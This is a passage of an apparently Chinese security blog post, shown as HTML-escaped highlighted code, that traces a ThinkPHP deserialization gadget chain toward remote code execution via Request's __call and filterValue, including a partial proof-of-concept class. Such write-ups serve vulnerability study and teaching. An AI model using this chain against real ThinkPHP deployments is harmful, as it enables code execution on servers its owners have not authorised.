        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;InvalidArgumentException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;property not exists:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现：其值可以由&lt;code&gt;$this-&amp;gt;data[$name]&lt;/code&gt;确定，那么我们可以控制Attribute类属性data值，且$this-&amp;gt;data[$name]的键&lt;code&gt;name&lt;/code&gt;是由最初append中的key决定的，也是我们可控的，所以我们可以控制&lt;code&gt;$relation&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;梳理反序列化触发链：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Windwos类
__dustruct &amp;gt; removeFiles() &amp;gt; file_exists($filename) &amp;gt; $filename可控 触发__toString()

# Conversion类
__toString() &amp;gt; toJson() &amp;gt; toArray() &amp;gt; $relation-&amp;gt;visible($name)  &amp;gt; $relation可控和$name可控 触发__call()

# $name可控
从Conversion类的append属性中读取，所以可控

# $relation可控
Attribute类中getAttr($key) &amp;gt; getData($name) &amp;gt; $data[$name]
其中data为Attribute类属性，键$name可由append控制，所以可控
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;发现&lt;code&gt;Conversion&lt;/code&gt;和&lt;code&gt;Attribute&lt;/code&gt;为trait类：&lt;/p&gt;
&lt;p&gt;自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 &lt;code&gt;trait&lt;/code&gt;。通过在类中使用&lt;code&gt;use&lt;/code&gt; 关键字，声明要组合的Trait名称。所以，这里类的继承要使用&lt;code&gt;use&lt;/code&gt;关键字。&lt;/p&gt;
&lt;p&gt;trait类不能实例化，所以要找一个同时继承&lt;code&gt;Attribute&lt;/code&gt;类和&lt;code&gt;Conversion&lt;/code&gt;类的子类。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;全局搜索&lt;code&gt;Attribute&lt;/code&gt;，找到了Model类：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 147; 
			flex-basis: 354px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222161601996.png&#34; data-size=&#34;596x404&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222161601996.png&#34;
			width=&#34;596&#34;
			height=&#34;404&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222161601996_hu7cd6e64b6df639e02e075f98462d7490_55479_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222161601996_hu7cd6e64b6df639e02e075f98462d7490_55479_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;总计目前的利用POC：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$append&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;haha&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]];&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;haha&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()];&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来就是寻找A类，该类要么是存在visible方法且里面有敏感函数可以直接让我们利用，要么就是没有visible方法但存在__call()方法可让我们利用。&lt;/p&gt;
&lt;h2 id=&#34;敏感函数执行链&#34;&gt;敏感函数执行链&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;全局搜索&lt;code&gt;visible&lt;/code&gt;，发现没有什么可利用的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;全局搜索&lt;code&gt;__call()&lt;/code&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 191; 
			flex-basis: 459px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222162730444.png&#34; data-size=&#34;876x458&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222162730444.png&#34;
			width=&#34;876&#34;
			height=&#34;458&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222162730444_hucf5e35a72c812fc60e829e79fdb7ba0f_80949_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222162730444_hucf5e35a72c812fc60e829e79fdb7ba0f_80949_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最终在&lt;code&gt;Request.php&lt;/code&gt;中找到一个&lt;code&gt;__call&lt;/code&gt;方法，且其中存在&lt;code&gt;call_user_func_array&lt;/code&gt;，且参数&lt;code&gt;$this-&amp;gt;hook&lt;/code&gt;是可控的，&lt;code&gt;$args&lt;/code&gt;也是我们可控的(之前的反序列化触发链)。但是&lt;code&gt;array_unshift&lt;/code&gt;会在&lt;code&gt;$args&lt;/code&gt;头中插入$this，导致无法构造任意内容。&lt;/p&gt;
&lt;p&gt;因此，要找到另一个函数，让它被这里的&lt;code&gt;call_user_func_array&lt;/code&gt;调用，但是它对所需的参数无严格要求，且最终也能触发敏感函数。&lt;/p&gt;
&lt;p&gt;thinkphp中有多个远程代码执行洞都有一个filter覆盖的问题，所以尝试从这里入手。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找&lt;code&gt;filterValue&lt;/code&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 递归过滤给定的值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  mixed     $value 键值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  mixed     $key 键名
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  array     $filters 过滤方法+默认值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;filterValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filters&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_callable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;// 调用函数或者方法过滤
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call_user_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_scalar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;o&#34;&gt;....&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;存在&lt;code&gt;call_user_func&lt;/code&gt;敏感函数，往上找看&lt;code&gt;$filters&lt;/code&gt;和&lt;code&gt;$$value&lt;/code&gt;是否可控。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到&lt;code&gt;input&lt;/code&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 获取变量 支持过滤和默认值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  array         $data 数据源
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string|false  $name 字段名
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  mixed         $default 默认值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string|array  $filter 过滤函数
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// 获取原始数据
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// 解析name
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

            &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// 解析过滤器
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;array_walk_recursive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;filterValue&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;version_compare&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;PHP_VERSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;7.1.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;arrayReset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filterValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
		&lt;span class=&#34;o&#34;&gt;....&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会调用filterValue，需要继续往上找，看&lt;code&gt;$filter&lt;/code&gt;、&lt;code&gt;$data&lt;/code&gt;和&lt;code&gt;$name&lt;/code&gt;能否可控。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到&lt;code&gt;param&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 获取当前请求的参数
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  mixed         $name 变量名
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  mixed         $default 默认值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string|array  $filter 过滤方法
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
